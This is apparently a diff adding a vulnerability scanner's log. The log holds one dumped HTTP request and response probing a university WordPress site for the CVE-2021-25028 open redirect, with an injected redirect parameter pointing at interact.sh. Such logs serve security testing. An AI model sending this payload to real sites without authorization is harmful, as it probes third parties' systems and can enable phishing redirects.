@@ -1,0 +1,26 @@
+[CVE-2021-25028] Dumped HTTP request for https://camel.science.unimelb.edu.au/wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://interact.sh
+
+
+GET /wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://interact.sh HTTP/1.1
+Host: camel.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2021-25028] Dumped HTTP response https://camel.science.unimelb.edu.au/wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://interact.sh
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:17:29 GMT
+Location: https://blogs.unimelb.edu.au/camel/wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://interact.sh/
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Special url
+
+Redirecting...
